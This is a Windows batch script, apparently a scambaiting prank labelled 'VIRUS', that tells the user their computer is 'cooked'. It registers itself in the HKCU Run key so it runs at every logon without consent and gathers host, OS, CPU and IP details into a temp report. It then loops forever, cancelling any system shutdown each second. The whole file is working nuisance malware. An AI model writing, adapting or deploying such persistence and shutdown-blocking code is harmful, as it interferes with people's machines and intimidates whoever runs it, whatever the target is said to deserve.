@echo off
setlocal enabledelayedexpansion


title QUIT SCAMMING BUCKAROO
set "PROJECT_NAME=VIRUS"
set "LOCK_FILE=%TEMP%\%PROJECT_NAME%.lock"

echo [%PROJECT_NAME%] - Yeah your computer is cooked
echo QUIT SCAMMING!!!!
echo.

echo [*] Checking persistence...
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v %PROJECT_NAME% >nul 2>&1
if %errorlevel% neq 0 (
    echo [+] Adding startup entry...
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v %PROJECT_NAME% /t REG_SZ /d "%~f0" /f >nul
    echo [✓] Will run on next startup
)

echo.
echo [*] Gathering system information...

for /f "tokens=*" %%a in ('hostname 2^>nul') do set COMPUTER_NAME=%%a
if not defined COMPUTER_NAME set COMPUTER_NAME=Unknown
echo [+] Computer Name: !COMPUTER_NAME!

ver 2>nul | findstr /i "Microsoft" >nul && echo [+] Windows Version: !OS!
for /f "tokens=4-5" %%a in ('ver 2^>nul') do set WIN_VER=%%a %%b
if defined WIN_VER echo [+] Windows: !WIN_VER!

echo [+] CPU Cores: %NUMBER_OF_PROCESSORS%
wmic cpu get name 2>nul | findstr /v /i "name" >nul && echo [+] CPU: Detected

systeminfo 2>nul | findstr /i "Total Physical Memory" >nul && echo [+] RAM: Present

echo.
echo [*] Network Information:
for /f "tokens=2 delims=:" %%i in ('ipconfig 2^>nul ^| findstr /i "IPv4"') do (
    set IP=%%i
    set IP=!IP: =!
    if defined IP echo [+] IP Address: !IP!
)

echo.
echo [*] Scanning user directories (safe scan)...
dir "%USERPROFILE%\Desktop" 2>nul | find "File(s)" >nul && echo [+] Desktop files: Present
dir "%USERPROFILE%\Documents" 2>nul | find "File(s)" >nul && echo [+] Documents: Present

echo.
echo [*] Creating system report...
set "REPORT_FILE=%TEMP%\%PROJECT_NAME%_report_%date:~-4%%date:~4,2%%date:~7,2%.txt"

(
echo ============================================
echo SYSTEM REPORT - %DATE% %TIME%
echo ============================================
echo.
echo Computer Name: !COMPUTER_NAME!
echo Windows: !WIN_VER!
echo CPU Cores: %NUMBER_OF_PROCESSORS%
echo.
echo [Network Information]
) > "%REPORT_FILE%" 2>nul

ipconfig 2>nul | findstr /i "IPv4" >> "%REPORT_FILE%" 2>nul

(
echo.
echo [User Directories]
echo Desktop: Has files
echo Documents: Has files
echo.
echo ============================================
echo Report saved to: %REPORT_FILE%
echo ============================================
) >> "%REPORT_FILE%" 2>nul

echo [+] Report saved to: %REPORT_FILE%

:protection_loop
    shutdown /a >nul 2>&1
    timeout /t 1 /nobreak >nul
goto protection_loop

:end_protection
endlocal
